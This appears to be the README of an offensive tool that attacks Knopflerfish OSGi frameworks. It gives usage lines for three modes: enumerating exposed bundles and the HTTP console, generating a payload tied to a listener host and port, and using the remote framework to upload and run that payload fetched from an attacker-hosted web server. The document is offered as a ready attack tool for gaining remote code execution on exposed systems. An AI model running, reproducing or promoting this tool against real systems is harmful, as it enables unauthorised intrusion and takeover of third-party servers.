#KFFT<BR>
Knopflerfish Attack tool

KFT usage and "modes"<BR>
Mode 1 runs an enum scan<BR>
-Checks for default bundle info, HTTPConsole, and if the remote framework is running<BR>
-Usage: python knopflerfucktool.py 1 [rhost] [rport]<BR>
Mode 2 outputs a payload to upload however you like<BR>
-Usage: python knopflerfucktool.py 2 [lhost] [lport]<BR>
-This mode also makes the payload needed for mode 3<BR>
-Requires openJDK 1.8.0 and Eclipse Equinox (eceq.jar)<BR>
Mode 3 uses the KF Remote Framework to upload and run a payload<BR>
-Usage: python knopflerfucktool.py 3 [rhost] [rport] [srvhost] [srvport] [lport]<BR>
-This mode needs the payload from mode 2<BR>
-The payload needs to be host on the web root of http://[srvhost]:[srvport]/<BR>
